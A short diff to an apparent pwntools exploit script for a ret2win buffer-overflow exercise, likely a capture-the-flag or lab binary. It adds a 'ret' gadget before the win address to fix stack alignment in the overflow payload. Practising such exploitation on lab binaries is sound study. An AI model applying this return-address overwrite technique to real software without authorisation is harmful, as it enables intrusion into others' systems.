@@ -34,8 +34,10 @@ log.info(f"Offset found: {offset}")
 p = process(context.binary.path)
 
 gadget_ret2win = 0x400756
+gadget_ret = 0x40053e
 
 payload = b"a" * (offset)
+payload += p64(gadget_ret)
 payload += p64(gadget_ret2win)
 
 p.sendline(payload)
